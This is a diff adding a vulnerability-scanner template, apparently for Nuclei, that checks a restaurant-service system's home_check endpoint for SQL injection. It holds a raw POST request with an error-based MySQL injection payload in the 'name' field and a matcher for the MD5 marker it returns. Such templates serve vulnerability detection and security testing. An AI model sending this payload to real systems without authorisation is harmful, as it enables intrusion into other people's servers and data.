@@ -1,0 +1,34 @@
+id: danxingyun-home_check-sqli
+info:
+  name: 喰星云·数字化餐饮服务系统home_check存在SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/%E5%96%B0%E6%98%9F%E4%BA%91%C2%B7%E6%95%B0%E5%AD%97%E5%8C%96%E9%A4%90%E9%A5%AE%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F/%E5%96%B0%E6%98%9F%E4%BA%91%C2%B7%E6%95%B0%E5%AD%97%E5%8C%96%E9%A4%90%E9%A5%AE%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9Fhome_check%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: sqli,danxingyun
+
+http:
+  - raw:
+      - |
+        POST /chainsales/mobile/home/check HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3055.69 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 94
+
+        name=%' AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(1=1,MD5(1)))),0x7e),8475) AND '1%'='1&pwd=123
+                
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,'c4ca4238a0b923820dcc50')
+        condition: and
